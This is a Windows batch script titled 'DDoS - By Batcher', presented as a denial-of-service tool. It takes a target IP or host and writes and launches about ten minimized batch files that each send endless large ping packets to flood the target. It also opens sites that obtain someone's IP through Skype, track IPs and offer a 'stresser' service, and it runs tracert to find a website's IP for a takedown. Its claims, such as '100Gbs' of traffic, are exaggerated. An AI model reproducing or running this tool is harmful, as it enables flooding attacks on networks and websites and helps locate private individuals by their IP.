
mode CON: cols=90 LINES=22
title DDoS - By Batcher                                                                                                          V.3.4

if exist C:\Users\%username%\AppData\Local\Temp\DDoS\ goto skipmd
md C:\Users\%username%\AppData\Local\Temp\DDoS\

:skipmd
cd C:\Users\%username%\AppData\Local\Temp\DDoS\
goto init

:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a

@echo off
cls
echo.
echo   ÛÛÛÛÛÛ» ÛÛÛÛÛÛ»  ÛÛÛÛÛÛ» ÛÛÛÛÛÛÛ»    ÛÛÛÛÛÛ» ÛÛ»  ÛÛ»
echo   ÛÛÉÍÍÛÛ»ÛÛÉÍÍÛÛ»ÛÛÉÍÍÍÛÛ»ÛÛÉÍÍÍÍ¼    ÈÍÍÍÍÛÛ»ÛÛº  ÛÛº
echo   ÛÛº  ÛÛºÛÛº  ÛÛºÛÛº   ÛÛºÛÛÛÛÛÛÛ»     ÛÛÛÛÛÉ¼ÛÛÛÛÛÛÛº
echo   ÛÛº  ÛÛºÛÛº  ÛÛºÛÛº   ÛÛºÈÍÍÍÍÛÛº     ÈÍÍÍÛÛ»ÈÍÍÍÍÛÛº
echo   ÛÛÛÛÛÛÉ¼ÛÛÛÛÛÛÉ¼ÈÛÛÛÛÛÛÉ¼ÛÛÛÛÛÛÛº    ÛÛÛÛÛÛÉ¼ÛÛ»  ÛÛº
echo   ÈÍÍÍÍÍ¼ ÈÍÍÍÍÍ¼  ÈÍÍÍÍÍ¼ ÈÍÍÍÍÍÍ¼    ÈÍÍÍÍÍ¼ ÈÍ¼  ÈÍ¼
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Home"  "
call :color f "---- "
call :color a "To DDoS The Network That You're Connected To With 100Gbs     "    
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "List"  "
call :color f "---- "
call :color a "To See The Recent IP's You've Entered" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Skype" "
call :color f "---- "
call :color a "To Get Someone's IP With Skype                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Server "
call :color f " ---- "
call :color a "To Get A Website's IP" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Track" "
call :color f "---- "
call :color a "To Track Someone's IP                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Help" "
call :color f " ---- "
call :color a "For Help Page                                        " & echo.
echo.

set /p ip= Choice / IP to target:
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat -n 1

>nul find "Please check the name and try again." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
  goto invalidip
) || (
  goto validip2
)

:validip2
>nul find "Destination host unreachable." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
  goto invalidip
) || (
  goto validip3
)

:validip3
>nul find "Request timed out." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
  goto invalidip
) || (
  goto validip4
)

:validip4
>nul find "PING: transmit failed. General failure." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
echo  %date%             IP: %ip%   >> C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
call :color f "                                   "
call :color a0 " - IP is Valid - " & echo.
call :color 0 " "
call :color 2f "Package:"
call :color 0a " 32 - 15000                                               "
call :color 2f "The Bigger The Better"
call :color 0a "                                                                                             "
call :color 9f "F) Detect Package"
call :color a "                                                               E) Back" & echo.
echo.
set /p package= Package: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
echo title DDoS Assistance     >> C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto running
goto ddoslauncher

:running
cls
echo.
ping %IP% -t -l %package% 
exit

:get
start http://mostwantedhf.info
goto start

:track
start http://www.ip-tracker.org/
goto start

:server
color f
cls
echo.
call :color 28 "   If You Have A Light"
call :color 28 "                                                            E) Back "
call :color 28 "    Speed Network You Can                                                                "  
call :color 28 "      Take Down A Website                                                                " 
call :color 28 "        If Not Then You Will                                                             " 
call :color 28 "          Have No Use Of This Feature                                                        " 
echo.
set /p trace=https://
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP Over This Text --
echo     Copy It If You Want It
echo.
pause
goto start

:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " How To Target An Ip" & echo.
call :color b "                     Enter The Ip You Want To DDoS In The Area" & echo.
echo                               "Choice / IP to target:" 
echo.
call :color a " Press "
call :color e "Enter"
call :color a " To Return
set /p nul=
goto start

:home
start https://stressboss.net/test.php
goto start

:list
cls
if exist C:\Users\%username%\AppData\Local\Temp\DDoS\history.log type C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start

:clear
del C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
goto start

:find
cls
set /a package=11000
echo title Package Detector     >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
echo :beginning                 >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
echo if exist C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat call C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
echo goto beginning             >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
set "launch=1"

:launcher
start /min C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher

:resetfind
if exist C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat del C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
set /a package=%package% - 1000

if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
if exist C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat del C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat
ping %ip% -l %package% -t -n 2 >> C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat -n 2

>nul find "Request timed out." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
  goto resetfind
) || (
  goto packlol
)

:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start


:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start

:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"
